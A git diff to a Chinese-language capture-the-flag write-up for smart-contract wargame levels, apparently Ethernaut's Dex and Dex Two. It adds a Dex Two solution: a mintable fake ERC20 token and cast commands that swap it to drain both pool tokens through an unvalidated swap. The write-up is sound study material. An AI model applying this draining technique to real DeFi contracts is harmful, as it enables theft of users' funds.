@@ -441,7 +441,7 @@ contract Attack is Buyer {
 ```js
 let token1=await contract.token1()
 let token2=await contract.token2()
-await contract.approve(instance,1000) //approve可以允许对方使用大于自己balance的token
+await contract.approve(instance,1000) //approve可以允许对方使用大于自己balance数量的token
 await contract.swap(token1,token2,10)
 await contract.swap(token2,token1,20)
 await contract.swap(token1,token2,24)
@@ -450,3 +450,28 @@ await contract.swap(token1,token2,41)
 await contract.swap(token2,token1,45)
 //最后先耗尽token1
 ```
+## Dex Two
+
+与Dex的源码比对，发现这题没有检查from和to是否为token1或token2。那就很好办了，自己创建一个假token作from即可
+```solidity
+contract MyToken is ERC20 {
+    constructor(string memory name, string memory symbol)
+        ERC20(name, symbol)
+    {}
+    function mint(address account, uint256 amount) public {
+        _mint(account,amount);
+    }
+}
+```
+拿到上述合约的地址后运行：
+```sh
+cast send "MyToken" "mint(address,uint256)" "instance" 100
+cast send "MyToken" "mint(address,uint256)" "player" 100
+cast send "MyToken" "approve(address,uint256)" "instance" 1000
+cast send "instance" "swap(address,address,uint256)" "MyToken" "token1" 100
+cast send "MyToken" "mint(address,uint256)" "player" 200
+cast send "instance" "swap(address,address,uint256)" "MyToken" "token2" 200
+```
+另外，我本来打算用console做这题的。结果报错：`Transaction was not mined within 50 blocks, please make sure your transaction was properly sent. Be aware that it might still be mined!`，跑去用foundry也报错:`server returned an error response: error code -32000: replacement transaction underpriced`
+
+解决办法是等一会，一段时间后foundry就不再报错了（估计是原交易被刷掉了）
